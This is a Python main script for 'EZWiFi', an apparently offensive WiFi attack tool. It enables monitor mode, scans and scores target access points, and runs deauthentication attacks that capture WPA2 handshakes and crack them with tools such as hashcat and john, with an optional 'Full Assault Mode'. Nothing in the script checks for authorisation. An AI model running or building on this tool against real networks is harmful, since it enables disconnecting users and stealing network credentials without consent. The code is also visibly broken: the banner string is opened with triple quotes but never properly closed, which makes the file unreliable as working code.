#!/usr/bin/env python3

import os
import sys
import subprocess
from src.interface_manager import detect_interfaces, enable_monitor_mode, reset_interface
from src.scanner import scan_networks
from src.client_score import score_targets
from src.deauth_controller import run_deauth_attack
from src.cracker import crack_hash
from src.logger import save_log
from src.utils import clear_screen, wait_for_key, ensure_dependencies
from src.profile_manager import load_profiles, save_profile
from src.config_manager import load_config
from src.assault_mode import run_full_assault

def print_banner():
    print(r"""
███████╗███████╗██╗    ██╗██╗███████╗██╗
██╔════╝╚══███╔╝██║    ██║██║██╔════╝██║
█████╗    ███╔╝ ██║ █╗ ██║██║█████╗  ██║
██╔══╝   ███╔╝  ██║███╗██║██║██╔══╝  ██║
███████╗███████╗╚███╔███╔╝██║██║     ██║
╚══════╝╚══════╝ ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
          EZWiFi — by 3xecutablefile
    ")

def select_interface(interfaces):
    print("[+] Available Adapters:")
    monitor_capable = [iface for iface in interfaces if iface['monitor']]
    if not monitor_capable:
        print("[!] No monitor-mode capable adapters found.")
        sys.exit(1)

    for i, iface in enumerate(monitor_capable):
        print(f"    {i}. {iface['name']}")

    try:
        idx = int(input("[?] Select adapter number: "))
        return monitor_capable[idx]['name']
    except (ValueError, IndexError):
        print("[!] Invalid selection.")
        sys.exit(1)

def cleanup(interface):
    config = load_config()
    if not config:
        print("[!] Cleanup failed: Could not load config.")
        return

    reset_interface(interface)
    
    if config.get("cleanup", {}).get("run_scripts"):
        print("[*] Running cleanup scripts...")
        try:
            subprocess.run(["./utils/scan_clean.sh"])
            subprocess.run(["./utils/iface_reset.sh", interface])
        except FileNotFoundError:
            print("[!] Cleanup scripts not found.")

def main():
    original_iface = None
    try:
        clear_screen()
        print_banner()

        if not sys.platform.startswith('linux'):
            print("[!] This tool is designed for Linux only.")
            sys.exit(1)

        if os.geteuid() != 0:
            print("[!] Run this script as root.")
            sys.exit(1)

        dependencies = ["aircrack-ng", "iw", "ip", "hostapd", "hashcat", "john", "bully", "hcxdumptool", "hcxpcapngtool", "cap2hccapx"]
        if not ensure_dependencies(dependencies):
            sys.exit(1)

        interfaces = detect_interfaces()
        if not interfaces:
            print("[!] No wireless interfaces detected.")
            sys.exit(1)

        original_iface = select_interface(interfaces)
        mon_iface = enable_monitor_mode(original_iface)
        if not mon_iface:
            sys.exit(1)

        target = None
        if os.path.exists("profiles/target_list.json"):
            print("[?] Load from profile? (y/N): ", end="")
            if input().lower() == 'y':
                profiles = load_profiles()
                if profiles:
                    target = score_targets(profiles)

        if not target:
            aps = scan_networks(mon_iface)
            target = score_targets(aps)
            if target:
                save_profile(target)

        if not target:
            print("[!] No target selected.")
            sys.exit(1)

        print(f"\n[+] Target selected: {target.get('ESSID')} ({target.get('BSSID')})")
        
        print("⚔️  Activate Full Assault Mode? (y/N): ", end="")
        if input().lower() == 'y':
            run_full_assault(mon_iface, target)
        else:
            # Default attack: Handshake capture and crack
            print("\n--- Running Default Attack: Handshake Capture ---")
            handshake_file = "handshake-01.cap"
            run_deauth_attack(mon_iface, target)
            if os.path.exists(handshake_file):
                crack_hash(handshake_file, "WPA2")

        save_log(target, target)
        wait_for_key()

    except KeyboardInterrupt:
        print("\n[!] User interrupted. Exiting...")
    finally:
        if original_iface:
            print("\n[*] Performing cleanup...")
            cleanup(original_iface)
        print("[*] EZWiFi session finished.")


if __name__ == "__main__":
    main()
